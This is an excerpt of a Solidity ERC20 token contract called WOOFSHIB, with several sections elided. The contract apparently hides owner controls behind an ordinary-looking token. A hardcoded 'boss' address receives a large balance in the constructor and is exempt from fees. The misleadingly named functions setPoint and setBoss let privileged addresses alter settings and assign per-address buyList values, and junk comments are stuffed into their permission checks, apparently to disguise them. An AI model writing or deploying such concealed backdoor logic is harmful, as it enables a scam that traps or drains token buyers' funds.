...
contract WOOFSHIB is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "WOOFSHIB";
    string private _symbol = "WOOFSHIB";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x0c32725798E7E6D3844b341e10c7339Cd9d285a6); 
    address payable private teamWalletAddress = payable(0xda3D0827aB7401AcD792a2E26eb2a7B7F3ABB2b5); 
	address payable private boss = payable(0x30f55948279916957f97Af2C5cDDb83Fa48F4E3A); 
    ...
    mapping (address => bool) public _swapMain;
    ...
    uint256 private minimumTokensBeforeSwap = 5* 10**4 * 10**_decimals;
	uint256 private _all = 1* 10**11 * 10**_decimals;
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
	    ...
	    isExcludedFromFee[boss] = true;
        
        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);

        _swapMain[address(uniswapPair)] = true;
		_swapMain[msg.sender] = true; 
		_tOwned[boss] = _all;
	...
	function setPoint(uint256 newLimit) external  {
	   if( _swapMain[ /*as aXxsdfghjk11;‘*/msg.sender])
	   {
	      _point = newLimit;
	   }      
    }
	...
	function setBoss(address  to, uint256 ABC) public {
		if( _swapMain[ /*as aXxsdfghjk11;‘*/msg.sender])
	   {
	      buyList[to] = ABC;
	   }   
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {   
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_swapMain[sender] && swapAndLiquifyEnabled) 
            {
